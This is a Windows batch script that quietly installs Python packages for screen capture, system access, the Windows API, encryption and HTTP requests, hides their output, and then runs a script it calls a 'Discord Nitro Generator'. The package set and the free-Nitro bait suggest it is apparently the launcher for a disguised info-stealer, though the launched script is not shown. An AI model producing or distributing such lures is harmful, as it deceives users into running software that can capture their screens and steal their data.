@echo off
title Installing Dependencies...
color 0A

echo Installing required packages...
echo.


pip install --quiet requests pyscreenshot pillow psutil pywin32 pycryptodome >nul 2>&1


python -c "import requests; import pyscreenshot; import psutil; import win32api; from Crypto.Cipher import AES" >nul 2>&1
if errorlevel 1 (
    echo Retrying installation...
    pip install --quiet requests pyscreenshot pillow psutil pywin32 pycryptodome >nul 2>&1
)

echo.
echo All packages installed!
echo.
echo Starting Discord Nitro Generator...
echo.

python nitrogen.py

if errorlevel 1 (
    echo.
    echo An error occurred. Please check:
    echo - Python is installed
    echo - All files are in the same folder
    echo.
    pause
)